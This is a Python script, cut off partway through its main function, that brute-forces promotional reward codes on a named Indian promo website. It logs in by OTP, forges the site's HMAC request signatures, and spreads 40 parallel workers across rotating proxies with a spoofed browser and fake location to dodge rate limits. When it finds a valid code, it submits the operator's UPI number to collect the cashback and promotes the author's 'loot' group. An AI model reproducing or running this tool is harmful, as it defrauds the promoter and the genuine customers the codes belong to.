#By @PrimesLooter

import argparse
import base64
import hashlib
import hmac
import json
import os
import random
import re
import secrets
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime, timedelta

import requests

BASE_URL = "https://slayyourplaypromo.in"
VALID_FILE = "validdd.txt"
INVALID_FILE = "invalid.txt"
PARALLEL_WORKERS = 40
CODE_LENGTH = 12
PROXY_FILE = "data.txt"
SESSION_FILE = "proxy_sessions.json"
MAX_RETRIES = 5
REQUEST_DELAY = 0.2  # 200ms delay between requests per proxy
SESSION_EXPIRY_MINUTES = 30  # Session expires after 30 minutes

USER_AGENT = (
    "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"
)

file_lock = threading.Lock()
valid_codes = set()
invalid_codes = set()
stats_lock = threading.Lock()
stats = {"tested": 0, "valid": 0, "invalid": 0, "errors": 0}
DEBUG = True
stop_event = threading.Event()
code_gen_lock = threading.Lock()
session_tried = set()
proxy_list = []
proxy_lock = threading.Lock()
proxy_index = 0
proxy_failures = {}
proxy_last_used = defaultdict(float)  # Track last use time per proxy
proxy_sessions = {}  # Store session per proxy
proxy_session_locks = defaultdict(threading.Lock)  # Lock per proxy for session access
sessions_loaded_from_disk = False  # Flag to track if sessions were loaded

# Global session credentials (shared across all proxies)
GLOBAL_USER_KEY = None
GLOBAL_DATA_KEY = None
GLOBAL_ACCESS_TOKEN = None
GLOBAL_MASTER_KEY = None
GLOBAL_SESSION_EXPIRY = None

_DIGIT_PALETTE = [
    ("\033[91m", "Crimson Pulse", "0"),
    ("\033[38;5;208m", "Sunset Ember", "1"),
    ("\033[93m", "Golden Ray", "2"),
    ("\033[92m", "Neon Mint", "3"),
    ("\033[96m", "Aqua Spark", "4"),
    ("\033[94m", "Ocean Blue", "5"),
    ("\033[95m", "Violet Haze", "6"),
    ("\033[38;5;201m", "Magenta Bloom", "7"),
    ("\033[38;5;51m", "Cyan Drift", "8"),
    ("\033[38;5;245m", "Silver Mist", "9"),
]
_RESET = "\033[0m"
_BOLD = "\033[1m"
_DIM = "\033[2m"


def _enable_ansi():
    if os.name == "nt":
        os.system("color")


def _play_digit_intro():
    _enable_ansi()
    print(f"\n{_BOLD}\033[38;5;51m{'═' * 58}{_RESET}")
    print(f"{_BOLD}\033[97m   SLAY YOUR PLAY — CODE TESTER{_RESET}")
    print(f"{_BOLD}\033[38;5;51m{'═' * 58}{_RESET}\n")

    lit = []
    for color, name, digit in _DIGIT_PALETTE:
        lit.append(f"{color}{_BOLD}{digit}{_RESET}")
        bar = " ".join(lit + [_DIM + "·" + _RESET] * (10 - len(lit)))
        print(f"  {bar}  {_DIM}│{_RESET} {color}{name}{_RESET} {_DIM}online{_RESET}")
        time.sleep(0.12)

    print(f"{_BOLD}\033[38;5;51m{'═' * 58}{_RESET}\n")
    time.sleep(0.35)


def debug(msg):
    if DEBUG:
        print(f"[DEBUG] {msg}")


def get_proxy_key(proxy):
    """Get a unique key for a proxy."""
    if not proxy:
        return None
    proxy_url = proxy.get('http', proxy.get('https', str(proxy)))
    return hashlib.md5(proxy_url.encode()).hexdigest()[:16]


def save_global_session():
    """Save global session to disk."""
    global GLOBAL_USER_KEY, GLOBAL_DATA_KEY, GLOBAL_ACCESS_TOKEN, GLOBAL_MASTER_KEY, GLOBAL_SESSION_EXPIRY
    
    if not all([GLOBAL_USER_KEY, GLOBAL_DATA_KEY, GLOBAL_ACCESS_TOKEN]):
        return
    
    session_data = {
        'user_key': GLOBAL_USER_KEY,
        'data_key': GLOBAL_DATA_KEY,
        'access_token': GLOBAL_ACCESS_TOKEN,
        'master_key': GLOBAL_MASTER_KEY,
        'expiry': GLOBAL_SESSION_EXPIRY.isoformat() if GLOBAL_SESSION_EXPIRY else datetime.now().isoformat(),
    }
    
    try:
        with open(SESSION_FILE, 'w') as f:
            json.dump(session_data, f, indent=2)
        print(f"[+] Saved global session to {SESSION_FILE}")
    except Exception as e:
        debug(f"[-] Failed to save session: {e}")


def load_global_session():
    """Load global session from disk."""
    global GLOBAL_USER_KEY, GLOBAL_DATA_KEY, GLOBAL_ACCESS_TOKEN, GLOBAL_MASTER_KEY, GLOBAL_SESSION_EXPIRY, sessions_loaded_from_disk
    
    if not os.path.exists(SESSION_FILE):
        return
    
    try:
        with open(SESSION_FILE, 'r') as f:
            session_data = json.load(f)
        
        if not session_data:
            return
        
        # Check if session is expired
        expiry = datetime.fromisoformat(session_data['expiry'])
        if datetime.now() > expiry:
            print(f"[!] Saved session expired on {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
            return
        
        GLOBAL_USER_KEY = session_data['user_key']
        GLOBAL_DATA_KEY = session_data['data_key']
        GLOBAL_ACCESS_TOKEN = session_data['access_token']
        GLOBAL_MASTER_KEY = session_data['master_key']
        GLOBAL_SESSION_EXPIRY = expiry
        sessions_loaded_from_disk = True
        
        print(f"[+] Loaded valid session from {SESSION_FILE}")
        print(f"[+] Session expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
        return True
        
    except Exception as e:
        print(f"[-] Failed to load session: {e}")
        return False


def load_proxies():
    """Load proxies from proxy_data.txt file."""
    global proxy_list
    proxy_list = []
    if not os.path.exists(PROXY_FILE):
        print(f"[!] Proxy file '{PROXY_FILE}' not found. Running without proxies.")
        return
    
    try:
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) >= 4:
                        proxy = {
                            'http': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
                            'https': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                        }
                        proxy_list.append(proxy)
                    elif len(parts) == 2:
                        proxy = {
                            'http': f"http://{parts[0]}:{parts[1]}",
                            'https': f"http://{parts[0]}:{parts[1]}"
                        }
                        proxy_list.append(proxy)
        print(f"[+] Loaded {len(proxy_list)} proxies from {PROXY_FILE}")
        
        global PARALLEL_WORKERS
        if len(proxy_list) < PARALLEL_WORKERS:
            print(f"[!] Warning: Only {len(proxy_list)} proxies loaded but {PARALLEL_WORKERS} threads requested.")
            print(f"[!] Adjusting threads to match proxy count: {len(proxy_list)}")
            PARALLEL_WORKERS = len(proxy_list)
        
        # Initialize sessions for all proxies
        initialize_proxy_sessions()
        
    except Exception as e:
        print(f"[-] Error loading proxies: {e}")
        print("[!] Running without proxies.")


def wait_for_proxy_delay(proxy_key):
    """Wait 0.2 seconds since last use of this proxy."""
    if not proxy_key:
        return
    
    with proxy_lock:
        last_used = proxy_last_used.get(proxy_key, 0)
        current_time = time.time()
        time_since_last = current_time - last_used
        
        if time_since_last < REQUEST_DELAY:
            sleep_time = REQUEST_DELAY - time_since_last
            time.sleep(sleep_time)
        
        proxy_last_used[proxy_key] = time.time()


def get_next_proxy():
    """Get next proxy in round-robin fashion."""
    global proxy_index
    if not proxy_list:
        return None
    
    with proxy_lock:
        proxy = proxy_list[proxy_index % len(proxy_list)]
        proxy_index += 1
        return proxy


def mark_proxy_failure(proxy):
    """Mark a proxy as failed to temporarily skip it."""
    if not proxy:
        return
    
    proxy_key = get_proxy_key(proxy)
    if not proxy_key:
        return
    
    with proxy_lock:
        if proxy_key not in proxy_failures:
            proxy_failures[proxy_key] = 0
        proxy_failures[proxy_key] += 1
        
        if proxy_failures[proxy_key] > 3:
            if proxy in proxy_list:
                proxy_list.remove(proxy)
                proxy_list.append(proxy)
                proxy_failures[proxy_key] = 0
                # Clean up session for this proxy
                if proxy_key in proxy_sessions:
                    try:
                        proxy_sessions[proxy_key].close()
                    except:
                        pass
                    del proxy_sessions[proxy_key]
                print(f"[!] Proxy {proxy_key[:40]}... moved to end due to failures")


def create_proxy_session(proxy):
    """Create a new session with proxy support using global credentials."""
    global GLOBAL_MASTER_KEY, GLOBAL_USER_KEY, GLOBAL_DATA_KEY, GLOBAL_ACCESS_TOKEN
    
    session = requests.Session()
    
    # Use proxy
    if proxy:
        session.proxies.update(proxy)
    
    session.headers.update({
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
        "origin": BASE_URL,
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Microsoft Edge";v="150"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": USER_AGENT,
    })
    
    # Add authorization header if we have access token
    if GLOBAL_ACCESS_TOKEN:
        session.headers.update({
            "authorization": f"Bearer {GLOBAL_ACCESS_TOKEN}"
        })
    
    # Set cookies
    if GLOBAL_USER_KEY:
        session.cookies.set("thumsup_and_sprite-id", str(GLOBAL_USER_KEY), domain="slayyourplaypromo.in")
    elif GLOBAL_MASTER_KEY:
        session.cookies.set("thumsup_and_sprite-id", GLOBAL_MASTER_KEY, domain="slayyourplaypromo.in")
    
    return session


def initialize_proxy_sessions():
    """Initialize sessions for all proxies concurrently."""
    global proxy_sessions
    
    if not proxy_list:
        return
    
    print(f"[*] Initializing sessions for {len(proxy_list)} proxies...")
    
    def init_session_for_proxy(proxy):
        proxy_key = get_proxy_key(proxy)
        try:
            session = create_proxy_session(proxy)
            with proxy_session_locks[proxy_key]:
                proxy_sessions[proxy_key] = session
            return True
        except Exception as e:
            print(f"[-] Failed to initialize session for proxy {proxy_key}: {e}")
            return False
    
    # Initialize sessions concurrently
    with ThreadPoolExecutor(max_workers=min(len(proxy_list), 20)) as executor:
        futures = {executor.submit(init_session_for_proxy, proxy): proxy for proxy in proxy_list}
        for future in as_completed(futures):
            proxy = futures[future]
            if not future.result():
                mark_proxy_failure(proxy)
    
    print(f"[+] Initialized {len(proxy_sessions)} proxy sessions")


def get_proxy_session(proxy):
    """Get session for a specific proxy."""
    proxy_key = get_proxy_key(proxy)
    if not proxy_key:
        return None
    
    with proxy_session_locks[proxy_key]:
        # Wait for proxy delay
        wait_for_proxy_delay(proxy_key)
        
        # Check if we have a session for this proxy
        if proxy_key in proxy_sessions:
            return proxy_sessions[proxy_key]
        
        # Create new session
        session = create_proxy_session(proxy)
        proxy_sessions[proxy_key] = session
        return session


def make_session(master_key, use_proxy=True, proxy=None):
    """Create a session with global credentials."""
    global GLOBAL_USER_KEY, GLOBAL_DATA_KEY, GLOBAL_ACCESS_TOKEN, GLOBAL_MASTER_KEY
    
    session = requests.Session()
    
    # Use proxy if provided
    if use_proxy and proxy:
        session.proxies.update(proxy)
        debug(f"Using proxy: {proxy.get('http', '')[:50]}...")
    elif use_proxy and proxy_list:
        proxy = get_next_proxy()
        if proxy:
            session.proxies.update(proxy)
            debug(f"Using proxy: {proxy.get('http', '')[:50]}...")
    
    session.headers.update({
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
        "origin": BASE_URL,
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Microsoft Edge";v="150"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": USER_AGENT,
    })
    
    # Use global credentials if available
    if GLOBAL_ACCESS_TOKEN:
        session.headers.update({
            "authorization": f"Bearer {GLOBAL_ACCESS_TOKEN}"
        })
        if GLOBAL_USER_KEY:
            session.cookies.set("thumsup_and_sprite-id", str(GLOBAL_USER_KEY), domain="slayyourplaypromo.in")
    else:
        session.cookies.set("thumsup_and_sprite-id", master_key, domain="slayyourplaypromo.in")
    
    return session


def generate_master_key():
    return str(random.randint(100000000, 999999999))


def init_code_scan():
    """Pure random codes — koi fixed sequence nahi."""
    global session_tried
    session_tried = set()
    print("[+] Mode: FULL RANDOM (non-sequential)")
    print(f"[+] Skipping {len(invalid_codes)} known invalid + {len(valid_codes)} known valid codes")


def generate_next_code():
    """Har baar random 12-digit code — sequence follow nahi karta."""
    total = 10 ** CODE_LENGTH
    with code_gen_lock:
        for _ in range(5000):
            code = str(secrets.randbelow(total)).zfill(CODE_LENGTH)
            if (
                code not in valid_codes
                and code not in invalid_codes
                and code not in session_tried
            ):
                session_tried.add(code)
                return code
    return None


def generate_signature_data(payload, user_key, data_key):
    payload_str = json.dumps(payload, separators=(",", ":"))
    a = base64.b64encode(payload_str.encode("utf-8")).decode("utf-8")

    ts = str(payload["t"])
    u = base64.b64encode(ts.encode("utf-8")).decode("utf-8")

    hmac_key = data_key[4:18].encode("utf-8")
    message = f"{u}.{a}".encode("utf-8")
    hex_sig = hmac.new(hmac_key, message, hashlib.sha256).hexdigest()
    f = base64.b64encode(hex_sig.encode("utf-8")).decode("utf-8")

    m = random.randint(1, 6)
    k = random.randint(2, 8)
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    h_rand = "".join(random.choice(alphabet) for _ in range(k))
    g = f"{k}{m}{f[0:m]}{h_rand}{f[m:]}"

    u_encoded = urllib.parse.quote_plus(u)
    a_encoded = urllib.parse.quote_plus(a)
    g_encoded = urllib.parse.quote_plus(g)

    return f"userKey={user_key}&data={u_encoded}.{a_encoded}.{g_encoded}"


def decrypt_response(encrypted_resp):
    try:
        decoded = base64.b64decode(encrypted_resp).decode("utf-8")
        return json.loads(decoded), True
    except Exception as e:
        return {"error": f"Failed to decrypt: {e}", "raw": encrypted_resp}, False


def load_existing_codes():
    global valid_codes, invalid_codes
    if os.path.exists(VALID_FILE):
        with open(VALID_FILE, "r") as f:
            for line in f:
                code = line.strip()
                if code:
                    valid_codes.add(code)
    if os.path.exists(INVALID_FILE):
        with open(INVALID_FILE, "r") as f:
            for line in f:
                code = line.strip()
                if code:
                    invalid_codes.add(code)
    print(f"[+] Loaded {len(valid_codes)} valid, {len(invalid_codes)} invalid codes")


def save_code(code, is_valid):
    with file_lock:
        filename = VALID_FILE if is_valid else INVALID_FILE
        with open(filename, "a") as f:
            f.write(f"{code}\n")


def get_timestamp():
    return int(time.time() * 1000)


def api_json_post(session, path, body, referer="/", use_proxy=True, proxy=None):
    headers = {
        "content-type": "application/json",
        "accept": "application/json",
        "referer": f"{BASE_URL}{referer}",
    }
    debug(f"POST {path} | body keys: {list(body.keys())}")
    
    # Wait for proxy delay if using proxy
    if use_proxy and proxy:
        proxy_key = get_proxy_key(proxy)
        wait_for_proxy_delay(proxy_key)
    
    for attempt in range(MAX_RETRIES):
        try:
            if attempt > 0 and use_proxy and proxy_list:
                if proxy is None:
                    new_proxy = get_next_proxy()
                else:
                    new_proxy = proxy
                    mark_proxy_failure(proxy)
                if new_proxy:
                    session.proxies.update(new_proxy)
                    debug(f"Retry {attempt}: Using new proxy")
                    proxy = new_proxy
            
            resp = session.post(f"{BASE_URL}{path}", json=body, headers=headers, timeout=30)
            debug(f"POST {path} | status={resp.status_code}")
            
            if resp.status_code in [429, 500, 502, 503, 504]:
                debug(f"Received {resp.status_code}, retrying... (attempt {attempt + 1}/{MAX_RETRIES})")
                if attempt < MAX_RETRIES - 1:
                    wait_time = 2 ** attempt
                    debug(f"Waiting {wait_time}s before retry")
                    time.sleep(wait_time)
                    continue
                else:
                    debug(f"Max retries reached for {path}")
                    if proxy:
                        mark_proxy_failure(proxy)
                    return resp
            
            # On 401, session expired
            if resp.status_code == 401:
                debug(f"Received 401 - session expired")
                return resp
            
            return resp
            
        except (requests.exceptions.RequestException, requests.exceptions.ConnectionError) as e:
            debug(f"Request error: {e}, retrying... (attempt {attempt + 1}/{MAX_RETRIES})")
            if attempt < MAX_RETRIES - 1:
                wait_time = 2 ** attempt
                debug(f"Waiting {wait_time}s before retry")
                time.sleep(wait_time)
                if use_proxy and proxy:
                    mark_proxy_failure(proxy)
                    if proxy_list:
                        new_proxy = get_next_proxy()
                        if new_proxy:
                            session.proxies.update(new_proxy)
                            proxy = new_proxy
            else:
                debug(f"Max retries reached for {path} after errors")
                return requests.Response()
    
    return requests.Response()


def api_form_post(session, path, payload, user_key, data_key, referer="/", access_token=None, use_proxy=True, proxy=None):
    ts = get_timestamp()
    payload["t"] = ts
    payload["userKey"] = user_key

    body = generate_signature_data(payload, user_key, data_key)
    headers = {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": f"{BASE_URL}{referer}",
    }
    if access_token:
        headers["authorization"] = f"Bearer {access_token}"

    url = f"{BASE_URL}{path}/{user_key}?t={ts}"
    debug(f"POST {path} | payload={json.dumps(payload)}")
    
    # Wait for proxy delay if using proxy
    if use_proxy and proxy:
        proxy_key = get_proxy_key(proxy)
        wait_for_proxy_delay(proxy_key)
    
    for attempt in range(MAX_RETRIES):
        try:
            if attempt > 0 and use_proxy and proxy_list:
                if proxy is None:
                    new_proxy = get_next_proxy()
                else:
                    new_proxy = proxy
                    mark_proxy_failure(proxy)
                if new_proxy:
                    session.proxies.update(new_proxy)
                    debug(f"Retry {attempt}: Using new proxy for {path}")
                    proxy = new_proxy
            
            resp = session.post(url, data=body, headers=headers, timeout=30)
            debug(f"POST {path} | status={resp.status_code}")
            
            if resp.status_code in [429, 500, 502, 503, 504]:
                debug(f"Received {resp.status_code}, retrying... (attempt {attempt + 1}/{MAX_RETRIES})")
                if attempt < MAX_RETRIES - 1:
                    wait_time = 2 ** attempt
                    debug(f"Waiting {wait_time}s before retry")
                    time.sleep(wait_time)
                    continue
                else:
                    debug(f"Max retries reached for {path}")
                    if use_proxy and proxy:
                        mark_proxy_failure(proxy)
                    return {"statusCode": resp.status_code, "message": f"Failed after {MAX_RETRIES} retries"}
            
            # Handle 401 - session expired
            if resp.status_code == 401:
                debug(f"Received 401 - session expired for {path}")
                return {"statusCode": 401, "message": "Session expired"}
            
            result = {}
            if resp.status_code == 200:
                try:
                    resp_json = resp.json()
                    if "resp" in resp_json:
                        result, _ = decrypt_response(resp_json["resp"])
                    else:
                        result = resp_json
                except Exception:
                    result = {"raw": resp.text}
            else:
                try:
                    resp_json = resp.json()
                    if "resp" in resp_json:
                        result, _ = decrypt_response(resp_json["resp"])
                    else:
                        result = resp_json
                except Exception:
                    result = {"statusCode": resp.status_code, "raw": resp.text}
            
            debug(f"POST {path} | response={json.dumps(result)}")
            return result
            
        except (requests.exceptions.RequestException, requests.exceptions.ConnectionError, 
                requests.exceptions.Timeout) as e:
            debug(f"Request error in {path}: {e}, retrying... (attempt {attempt + 1}/{MAX_RETRIES})")
            if attempt < MAX_RETRIES - 1:
                wait_time = 2 ** attempt
                debug(f"Waiting {wait_time}s before retry")
                time.sleep(wait_time)
                if use_proxy and proxy:
                    mark_proxy_failure(proxy)
                    if proxy_list:
                        new_proxy = get_next_proxy()
                        if new_proxy:
                            session.proxies.update(new_proxy)
                            proxy = new_proxy
            else:
                debug(f"Max retries reached for {path} after errors")
                return {"statusCode": 0, "message": f"Connection error: {str(e)}"}
    
    return {"statusCode": 0, "message": "Max retries exceeded"}


def init_session(session, master_key, use_proxy=True, proxy=None):
    global GLOBAL_USER_KEY, GLOBAL_DATA_KEY, GLOBAL_MASTER_KEY
    
    ip_info = {
        "as": "AS24560 Bharti Airtel Ltd., Telemedia Services",
        "city": "New Delhi",
        "country": "India",
        "countryCode": "IN",
        "isp": "Bharti Airtel",
        "lat": 28.6542,
        "lon": 77.2373,
        "org": "Bharti Airtel Ltd",
        "query": "0.0.0.0",
        "region": "DL",
        "regionName": "Delhi",
        "status": "success",
        "timezone": "Asia/Kolkata",
        "zip": "110001",
    }

    resp = api_json_post(session, "/api/users", {"masterKey": master_key, "ipInfo": ip_info}, use_proxy=use_proxy, proxy=proxy)
    if resp.status_code != 200:
        debug(f"[-] Init failed: HTTP {resp.status_code}")
        return None, None

    data = resp.json()
    decrypted, ok = decrypt_response(data.get("resp", ""))
    if not ok:
        debug(f"[-] Init decrypt failed: {decrypted}")
        return None, None

    user_key = decrypted.get("userKey")
    data_key = decrypted.get("dataKey")
    if not user_key or not data_key:
        debug(f"[-] Missing userKey/dataKey: {decrypted}")
        return None, None

    GLOBAL_USER_KEY = user_key
    GLOBAL_DATA_KEY = data_key
    GLOBAL_MASTER_KEY = master_key
    
    session.cookies.set("thumsup_and_sprite-id", str(user_key), domain="slayyourplaypromo.in")
    debug(f"[+] User Key: {user_key}")
    debug(f"[+] Data Key: {data_key}")
    return user_key, data_key


def click_track(session, user_key, data_key, use_proxy=True, proxy=None):
    result = api_form_post(
        session, "/api/users/clickTrack",
        {"smoker": "yes"},
        user_key, data_key,
        referer="/",
        use_proxy=use_proxy,
        proxy=proxy,
    )
    if result.get("statusCode") == 200:
        debug("[+] Click track OK")
        return True
    debug(f"[-] Click track failed: {result}")
    return False


def send_otp(session, user_key, data_key, mobile, use_proxy=True, proxy=None):
    result = api_form_post(
        session, "/api/users/register",
        {"mobile": mobile, "limit": ""},
        user_key, data_key,
        referer="/register",
        use_proxy=use_proxy,
        proxy=proxy,
    )
    if result.get("statusCode") == 200:
        debug(f"[+] OTP sent to {mobile}")
        return True
    debug(f"[-] OTP send failed: {result.get('message', result)}")
    return False


def verify_otp(session, user_key, data_key, otp, use_proxy=True, proxy=None):
    global GLOBAL_ACCESS_TOKEN, GLOBAL_SESSION_EXPIRY
    
    result = api_form_post(
        session, "/api/users/verifyOTP",
        {"otp": otp},
        user_key, data_key,
        referer="/register",
        use_proxy=use_proxy,
        proxy=proxy,
    )
    if result.get("statusCode") == 200 and result.get("accessToken"):
        GLOBAL_ACCESS_TOKEN = result.get("accessToken")
        GLOBAL_SESSION_EXPIRY = datetime.now() + timedelta(minutes=SESSION_EXPIRY_MINUTES)
        debug("[+] OTP verified! Login successful")
        return result.get("accessToken")
    debug(f"[-] OTP verify failed: {result.get('message', result)}")
    return None


def select_pack(session, user_key, data_key, access_token, use_proxy=True, proxy=None):
    result = api_form_post(
        session, "/api/users/selectPack",
        {"pack": "full"},
        user_key, data_key,
        referer="/choose-reward",
        access_token=access_token,
        use_proxy=use_proxy,
        proxy=proxy,
    )
    if result.get("statusCode") == 200:
        debug("[+] Pack selected")
        return True
    debug(f"[-] Pack select failed: {result}")
    return False


def select_vibe(session, user_key, data_key, access_token, use_proxy=True, proxy=None):
    result = api_form_post(
        session, "/api/users/selectVibe",
        {"vibe": "soft savage"},
        user_key, data_key,
        referer="/ai-rap-home",
        access_token=access_token,
        use_proxy=use_proxy,
        proxy=proxy,
    )
    if result.get("statusCode") == 200:
        debug("[+] Vibe selected - ready for code testing")
        return True
    debug(f"[-] Vibe select failed: {result}")
    return False


def test_code(session, code, user_key, data_key, access_token, use_proxy=True, proxy=None):
    if stop_event.is_set():
        return code, "skip", "stopped", {}
    if code in valid_codes or code in invalid_codes:
        return code, "skip", "already tested", {}

    global DEBUG
    DEBUG = False
    result = api_form_post(
        session, "/api/users/getCode",
        {"code": code},
        user_key, data_key,
        referer="/enter-unique-code",
        access_token=access_token,
        use_proxy=use_proxy,
        proxy=proxy,
    )
    DEBUG = True

    status = result.get("statusCode", 0)
    message = result.get("message", str(result))

    if status == 200:
        return code, "valid", message, result
    return code, "invalid", message, result


def submit_reward_mobile(session, user_key, data_key, access_token, mobile, code, code_result, use_proxy=True, proxy=None):
    print("\n" + "=" * 60)
    print(f"[REWARD] Valid code: {code}")
    print(f"[REWARD] Submitting mobile: {mobile}")
    print(f"[DEBUG] getCode response: {json.dumps(code_result)}")
    print("=" * 60)

    navigate = code_result.get("navigate", "")
    reward_type = code_result.get("rewardType", "")
    won_reward = code_result.get("wonReward")
    can_add_retailer = code_result.get("canAddRetailerCode")

    print(
        f"[DEBUG] navigate={navigate} | rewardType={reward_type} | "
        f"wonReward={won_reward} | canAddRetailerCode={can_add_retailer}"
    )

    referer = "/cashback"
    if navigate and "stick" in str(navigate).lower():
        referer = "/stick-cashback"

    result = api_form_post(
        session, "/api/users/getUpiNo",
        {"upiNo": mobile},
        user_key, data_key,
        referer=referer,
        access_token=access_token,
        use_proxy=use_proxy,
        proxy=proxy,
    )

    print(f"[REWARD] getUpiNo response: {json.dumps(result)}")

    if result.get("statusCode") == 200:
        print(f"[+] REWARD SUBMITTED! Mobile {mobile} pe reward aayega.")
        return True

    print(f"[-] Reward submit failed: {result.get('message', result)}")
    return False


def print_live_result(code, status, message):
    if status == "skip":
        return
    icon = "VALID" if status == "valid" else "INVALID"
    print(f"[LIVE] {code} | {icon} | {message}")
    with stats_lock:
        stats["tested"] += 1
        if status == "valid":
            stats["valid"] += 1
        elif status == "invalid":
            stats["invalid"] += 1


def is_global_session_expired():
    """Check if global session has expired."""
    global GLOBAL_SESSION_EXPIRY
    if not GLOBAL_SESSION_EXPIRY:
        return True
    return datetime.now() > GLOBAL_SESSION_EXPIRY


def run_code_tester(session, user_key, data_key, access_token, reward_mobile):
    global DEBUG, GLOBAL_SESSION_EXPIRY
    DEBUG = False
    stop_event.clear()
    with stats_lock:
        stats.update({"tested": 0, "valid": 0, "invalid": 0, "errors": 0})
    init_code_scan()

    print("\n" + "=" * 60)
    print(f"Starting code testing | {PARALLEL_WORKERS} parallel workers")
    print(f"Reward mobile: {reward_mobile}")
    print(f"Proxies loaded: {len(proxy_list)}")
    print(f"Proxy sessions initialized: {len(proxy_sessions)}")
    print(f"Request delay per proxy: {REQUEST_DELAY}s")
    print(f"Session expiry: {SESSION_EXPIRY_MINUTES} minutes")
    print(f"Session file: {SESSION_FILE}")
    print(f"Valid codes -> {VALID_FILE}")
    print("Valid code + UPI submit ke baad turant ruk jayega")
    print("Press Ctrl+C to stop")
    print("=" * 60 + "\n")

    executor = ThreadPoolExecutor(max_workers=PARALLEL_WORKERS)

    try:
        while not stop_event.is_set():
            codes = []
            while len(codes) < PARALLEL_WORKERS and not stop_event.is_set():
                code = generate_next_code()
                if code is None:
                    print("\n[!] Saare codes try ho chuke — scan khatam.")
                    stop_event.set()
                    break
                if code not in codes:
                    codes.append(code)

            if not codes or stop_event.is_set():
                break

            futures = {}
            for code in codes:
                # Get proxy for this request
                proxy = get_next_proxy() if proxy_list else None
                
                # Get session for this proxy
                if proxy:
                    proxy_session = get_proxy_session(proxy)
                    if not proxy_session:
                        # Create fallback session
                        proxy_session = create_proxy_session(proxy)
                else:
                    proxy_session = session
                    proxy = None
                
                # Use global credentials
                proxy_user_key = GLOBAL_USER_KEY
                proxy_data_key = GLOBAL_DATA_KEY
                proxy_access_token = GLOBAL_ACCESS_TOKEN
                
                # Submit the task
                futures[executor.submit(
                    test_code, 
                    proxy_session, 
                    code, 
                    proxy_user_key, 
                    proxy_data_key, 
                    proxy_access_token,
                    use_proxy=bool(proxy),
                    proxy=proxy
                )] = (code, proxy_session, proxy)
            
            for future in as_completed(futures):
                if stop_event.is_set():
                    break
                code, proxy_session, proxy = futures[future]
                try:
                    code, status, message, result = future.result()
                    print_live_result(code, status, message)
                    
                    if status == "valid":
                        stop_event.set()
                        for pending in futures:
                            pending.cancel()

                        valid_codes.add(code)
                        save_code(code, True)
                        print(f"\n[+] VALID CODE MILA: {code}")
                        DEBUG = True
                        
                        # Submit reward
                        submit_reward_mobile(
                            proxy_session, 
                            GLOBAL_USER_KEY, 
                            GLOBAL_DATA_KEY, 
                            GLOBAL_ACCESS_TOKEN,
                            reward_mobile, 
                            code, 
                            result,
                            use_proxy=bool(proxy),
                            proxy=proxy
                        )
                        
                        # Save session before exiting
                        save_global_session()
                        
                        print("\n[!] Code mil gaya + UPI submit ho gaya — 24 hour me reward credit ho jayga , join PrimesLooter for more loots.")
                        print_final_stats()
                        return
                    elif status == "invalid":
                        invalid_codes.add(code)
                        save_code(code, False)
                    elif status == "skip":
                        pass
                except Exception as e:
                    with stats_lock:
                        stats["errors"] += 1
                    print(f"[LIVE] ERROR | {e}")
                    if proxy:
                        mark_proxy_failure(proxy)

            with stats_lock:
                print(
                    f"\n[STATS] Tested: {stats['tested']} | "
                    f"Valid: {stats['valid']} | Invalid: {stats['invalid']} | "
                    f"Errors: {stats['errors']}\n"
                )
            
            # Save session periodically
            if stats['tested'] % 100 == 0:
                save_global_session()

    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        print_final_stats()
    finally:
        executor.shutdown(wait=False, cancel_futures=True)
        
        # Save session before exit
        save_global_session()


def print_final_stats():
    with stats_lock:
        print(
            f"[FINAL] Tested: {stats['tested']} | "
            f"Valid: {stats['valid']} | Invalid: {stats['invalid']} | "
            f"Errors: {stats['errors']}"
        )


def prompt_login_mobile():
    print("\n[*] Enter login mobile number (10 digits):")
    while True:
        mobile = input(">>> ").strip()
        if mobile and len(mobile) == 10 and mobile.isdigit():
            return mobile
        print("[-] Invalid mobile number. 10 digits required.")


def parse_args():
    parser = argparse.ArgumentParser(description="Slay Your Play code tester")
    parser.add_argument(
        "--mobile",
        default="",
        help="Login mobile number (prompted if not provided)",
    )
    parser.add_argument(
        "--reward-mobile",
        default="",
        help="Reward mobile (defaults to registration mobile)",
    )
    parser.add_argument("--otp", default="", help="OTP (skip prompt if provided)")
    parser.add_argument("--no-proxy", action="store_true", help="Disable proxy usage")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay in seconds between requests per proxy (default: 0.2)")
    parser.add_argument("--expiry", type=int, default=30, help="Session expiry in minutes (default: 30)")
    parser.add_argument("--clear-sessions", action="store_true", help="Clear saved sessions before starting")
    return parser.parse_args()


def main():
    _play_digit_intro()

    args = parse_args()
    
    # Clear sessions if requested
    if args.clear_sessions and os.path.exists(SESSION_FILE):
        os.remove(SESSION_FILE)
        print(f"[+] Cleared session file: {SESSION_FILE}")
    
    # Set global constants from args
    global REQUEST_DELAY, SESSION_EXPIRY_MINUTES
    REQUEST_DELAY = args.delay
    SESSION_EXPIRY_MINUTES = args.expiry
    
    # Load proxies first
    if not args.no_proxy:
